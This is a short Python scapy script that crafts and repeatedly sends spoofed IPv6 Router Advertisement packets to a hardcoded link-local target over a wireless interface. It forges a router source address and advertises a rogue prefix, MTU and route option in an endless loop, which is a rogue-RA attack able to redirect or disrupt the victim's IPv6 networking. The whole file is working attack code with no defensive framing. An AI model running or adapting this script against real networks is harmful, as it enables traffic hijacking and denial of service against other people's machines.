#! /usr/bin/env python

'''
Sends IPv6 RA packets to specified address
'''

from scapy.all import *

def get_if_ip6(interface):
	lst = in6_getifaddr()
	l = filter(lambda x: x[2] == interface, lst)[0][0]
	return l

dstip6='fe80::39e9:197a:fe2:2d6e'
pref='f2::'
interface='wlan0'

spoofip6 = get_if_ip6(interface)

a = neighsol(dstip6, spoofip6, interface)
if a and a.haslayer(ICMPv6NDOptDstLLAddr):
	dstmac = a.getlayer(ICMPv6NDOptDstLLAddr).lladdr
else:
	print "Couldn't find MAC for:",dstip6
	exit(1)

RA_at = Ether(src=get_if_hwaddr(interface),dst=dstmac) 
RA_at /= IPv6(src="fe80::e",dst=dstip6)/ICMPv6ND_RA(chlim=255) 
RA_at /= ICMPv6NDOptPrefixInfo(prefix=pref, prefixlen=64) 
RA_at /= ICMPv6NDOptSrcLLAddr(lladdr=RA_at.src) 
RA_at /= ICMPv6NDOptMTU() 
RA_at /= ICMPv6NDOptRouteInfo(len=3,prf=1)

sendp(RA_at, iface=interface, loop=1, inter=5, verbose=0)
